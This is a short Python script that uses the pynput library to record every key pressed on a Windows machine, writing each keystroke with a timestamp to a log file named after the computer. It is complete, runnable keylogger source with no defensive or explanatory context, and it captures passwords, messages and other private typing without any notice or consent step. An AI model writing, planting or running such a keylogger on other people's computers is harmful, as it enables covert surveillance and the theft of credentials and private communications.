from pynput.keyboard import Listener
import logging
import os
sysname = os.environ['COMPUTERNAME']
logging.basicConfig(filename=sysname+"_Klog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key): 
    logging.info("Key pressed: {0}".format(key))

with Listener(on_press=on_press) as listener:
    listener.join()  
